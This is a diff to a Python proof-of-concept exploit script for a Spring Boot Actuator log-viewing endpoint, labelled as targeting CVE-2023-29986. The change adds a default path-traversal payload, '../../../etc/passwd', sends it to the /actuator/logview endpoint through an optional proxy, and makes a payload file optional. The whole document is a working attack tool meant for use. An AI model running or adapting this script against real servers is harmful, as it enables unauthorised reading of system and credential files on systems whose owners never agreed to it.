@@ -5,8 +5,7 @@ import requests
 import argparse
 from urllib.parse import urljoin
 
-# Check for CVE-2023-29986
-def exploit_spring_boot_actuator(target_url, proxy_url, payload_file):
+def exploit_spring_boot_actuator(target_url, proxy_url, payload_file=None):
     endpoint = "/actuator/logview"
     
     # Proxy settings
@@ -15,9 +14,14 @@ def exploit_spring_boot_actuator(target_url, proxy_url, payload_file):
         "https": proxy_url
     }
     
-    # Read payloads from file
-    with open(payload_file, 'r') as f:
-        payloads = f.readlines()
+    # Default payload
+    default_payload = "../../../etc/passwd"
+    
+    # Read payloads from file if provided
+    payloads = [default_payload]
+    if payload_file:
+        with open(payload_file, 'r') as f:
+            payloads = f.readlines()
     
     for payload in payloads:
         payload = payload.strip()
@@ -40,9 +44,9 @@ def exploit_spring_boot_actuator(target_url, proxy_url, payload_file):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="PoC for CVE-2023-29986")
-    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://target.com)")
-    parser.add_argument("-p", "--proxy", default="https://127.0.0.1:8080", help="Proxy URL (default is https://127.0.0.1:8080)")
-    parser.add_argument("-pl", "--payload-file", required=True, help="File containing payloads")
+    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://localhost:8080)")
+    parser.add_argument("-p", "--proxy", default="http://127.0.0.1:8080", help="Proxy URL (default is http://127.0.0.1:8080)")
+    parser.add_argument("-pl", "--payload-file", help="File containing payloads (optional)")
     
     args = parser.parse_args()
     exploit_spring_boot_actuator(args.target, args.proxy, args.payload_file)
